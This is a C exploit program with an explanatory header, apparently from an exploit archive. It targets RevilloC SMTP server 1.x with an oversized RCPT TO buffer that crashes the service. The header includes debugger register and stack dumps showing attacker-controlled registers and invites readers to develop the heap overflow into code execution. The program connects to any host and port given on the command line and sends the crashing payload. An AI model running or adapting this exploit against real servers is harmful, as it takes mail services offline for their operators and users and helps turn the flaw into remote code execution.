/*
=============================================================
0-day RCPT TO DoS Exploit for RevilloC SMTP version 1.x
=============================================================
Sending a large buffer  (4080 bytes) in conjunction with the "MAIL
FOR:" or "RCPT TO:"  and other commands can cause a denial of service
attack causing the application to crash, consume 99% CPU usage until
the application is terminated or cause the host computer to stop
responding entirely requiring a reboot.  Also a heap overflow attack
vector is possible, sending a buffer greater than 4088 bytes causes
EDI, EBX, and EAX and ECX to be overwritten with values of the
malformed packet.

If you have the time to turn this into an Exploit go for it.  Just
credit me thats all i ask.  I wish i had the time but my full time
job of coding silly 200,000+ line accounting applications is a hand full.


The buffer overflow happens here:
7C91B3FB   . 8B0B           MOV ECX,DWORD PTR DS:[EBX]
7C91B3FD   . 3B4F 04        CMP ECX,DWORD PTR DS:[EDI+4]

EAX 001669F0
ECX 00004141  << points to a section of the buffer
EDX 00AD0030
EBX 88888888 << can be controlled by the attacker
ESP 0012F2D0
EBP 0012F4EC
ESI 001669E8
EDI 77777777 << can be controlled by the attacker
EIP 7C91B3FB ntdll.7C91B3FB
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDF000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
DR0 00000000
DR1 00000000
DR2 00000000
DR3 00000000
DR6 00000000
DR7 00000000


and here is the stack
0012F2F4  /0012F334
0012F2F8  |4CDE2A15  RETURN to IDPDX32.4CDE2A15 from <JMP.&IDAPI32.OsMuxUnlock>
0012F2FC  |010587BC
0012F300  |4BE5274A  IDAPI32.4BE5274A
0012F304  |00000001
0012F308  |77777777
0012F30C  |0012F334
0012F310  |00000000
0012F314  |00120000
0012F318  |00000000
0012F31C  |0012F300
0012F320  |4CDE2877  RETURN to IDPDX32.4CDE2877 from IDPDX32.4CE163F4
0012F324  |0012FC18
0012F328  |FFFFFFFF
0012F32C  |01065DBC
0012F330  |00000000
0012F334  ]0012F34C
0012F338  |4BE4095E  RETURN to IDAPI32.4BE4095E from IDAPI32.4BE41D04
0012F33C  |0012F7D8
0012F340  |0000002D
0012F344  |6BDE97A6
0012F348  |0012F7D8
0012F34C  \0012F7B8

and on closer inspection it appears its trying to turn the parameter
into a lowercase format.  (This was when the RCPT TO: command was overflowed)

001659F0  6C 61 64 64 72 65 73 73 00 6C 6F 77 65 72 00 41  laddress.lower.A
00165A00  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00165A10  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
...... huge buffer....
001669E0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
001669F0  77 77 77 77 88 88 88 88 00 00 00 00 00 00 00 00  wwww............


This was quickly compiled in LCC-Win32 (Free C++ compiler and IDE)
- Greg Linares
Questions/Comments/Etc --> GLinares.code [at] gmail [dot] com
*/



#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
static char overflow[65000];
static char buff2[65000];
WSADATA wsaData;


struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
int i;
char *hostname;
unsigned short port;

if (argc <= 1)
   {
	  printf("\n===========================================================\n");
	  printf("0-day RevilloC SMTP Mail Server Suite <= 1.21 RCPT TO: DoS\n");
	  printf("Exploits the RCPT TO parameter (MAIL FROM can be exploited too)\n");
	  printf("Buffer > 4080 causes the app to crash - heap based overflow\n");
	  printf("Exploit and Discovered By: Greg Linares (glinares.code [at ] gmail [dot] com)\n");
	  printf("==============================================================\n");
      printf("Usage: %s [hostname] [port]\n", argv[0]);
      printf("default port is 25 \n");
      exit(0);
   }


hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi("25");

if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   {
      fprintf(stderr, "Error setting up with WinSock v1.1\n");
      exit(-1);
   }


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf("ERROR: Uknown host %s\n", hostname);
	  printf("%s",hostname);
      exit(-1);
   }

   sockin.sin_family = hp->h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Socket Error\n");
      exit(-1);
   }

   if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf("ERROR: Connect Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Recv Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }

   /* wait for SMTP service welcome*/
   buf[bytes] = '\0';
   check = strstr(buf, "2");
   if (check == NULL)
   {
      printf("ERROR: NO  response from SMTP service\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   static char Exp1[65000];
   memset(Exp1, 0, 4096);
   char Exp[] = "RCPT TO: ";
   char tail[] = "@a.com>\r\n";
   char A[] = "A";
   memset(overflow, 0, 65000);
   memset(buff2, 0, 100);
   for (i=0; i<100; i++)
	{
	   strcat(buff2, "A");
	}

   char EHLO[] = "EHLO \r\n";
   char MF[] = "MAIL FROM: <HI@";
 	strcat(overflow, MF);
	strcat(overflow, buff2);
	strcat(overflow, tail);



   send(sockfd, EHLO, strlen(EHLO), 0);
	Sleep(500);
	send(sockfd, overflow, strlen(overflow),0);
	Sleep(1000);
	strcat(Exp1, Exp);
	for (i=0; i<4096; i++){
		strcat(Exp1, A);
	}
	strcat(Exp1, "\xDE\xAD\xBA\xBE");
	strcat(Exp1, tail);

	printf("%s", Exp1);
	send(sockfd, Exp1, strlen(Exp1),0);
	Sleep(2000);
    printf("Overflow Packet Sent Successfully...\n");
	closesocket(sockfd);
   WSACleanup();
 }

// milw0rm.com [2006-10-25]
